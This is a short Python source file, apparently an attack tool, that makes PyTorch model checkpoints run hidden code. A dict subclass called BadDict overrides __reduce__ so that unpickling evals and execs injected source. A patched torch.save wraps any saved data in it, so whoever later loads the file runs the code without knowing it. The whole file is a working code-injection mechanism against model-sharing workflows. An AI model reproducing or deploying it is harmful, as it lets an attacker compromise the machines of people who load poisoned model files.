from typing import Callable
import inspect
import torch

class BadDict(dict):
    def __init__(self, inject_src: str, **kwargs):
        super().__init__(**kwargs)
        self._inject_src = inject_src
    def __reduce__(self):
        return eval, (f"exec('''{self._inject_src}''') or dict()",), None, None, iter(self.items())

def patch_save_function(function_to_inject: Callable):
    source = inspect.getsourcelines(function_to_inject)[0] # get source code
    source = source[1:] # drop function def line
    indent = len(source[0]) - len(source[0].lstrip()) # find indent of body
    source = [line[indent:] for line in source] # strip first indent
    inject_src = "\n".join(source) # make into single string
    def patched_save_function(dict_to_save, *args, **kwargs):
        dict_to_save = BadDict(inject_src, **dict_to_save)
        return torch.save(dict_to_save, *args, **kwargs)
    return patched_save_function
